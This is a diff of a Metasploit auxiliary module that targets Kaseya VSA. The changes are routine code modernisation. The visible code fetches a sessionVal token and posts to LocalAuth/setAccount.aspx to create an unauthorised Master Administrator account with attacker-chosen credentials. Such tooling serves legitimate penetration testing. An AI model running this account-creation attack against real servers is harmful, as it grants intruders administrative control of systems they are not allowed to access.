@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -40,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('KASEYA_USER', [true, 'The username for the new admin account', 'msf']),
         OptString.new('KASEYA_PASS', [true, 'The password for the new admin account', 'password']),
         OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
-      ], self.class)
+      ])
   end
 
 
@@ -53,11 +50,11 @@ class Metasploit3 < Msf::Auxiliary
     if res && res.body && res.body.to_s =~ /ID="sessionVal" name="sessionVal" value='([0-9]*)'/
       session_val = $1
     else
-      print_error("#{peer} - Failed to get sessionVal")
+      print_error("Failed to get sessionVal")
       return
     end
 
-    print_status("#{peer} - Got sessionVal #{session_val}, creating Master Administrator account")
+    print_status("Got sessionVal #{session_val}, creating Master Administrator account")
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'LocalAuth', 'setAccount.aspx'),
@@ -73,11 +70,11 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     unless res && res.code == 302 && res.body && res.body.to_s.include?('/vsapres/web20/core/login.asp')
-      print_error("#{peer} - Master Administrator account creation failed")
+      print_error("Master Administrator account creation failed")
       return
     end
 
-    print_good("#{peer} - Master Administrator account with credentials #{datastore['KASEYA_USER']}:#{datastore['KASEYA_PASS']} created")
+    print_good("Master Administrator account with credentials #{datastore['KASEYA_USER']}:#{datastore['KASEYA_PASS']} created")
     service_data = {
       address: rhost,
       port: rport,
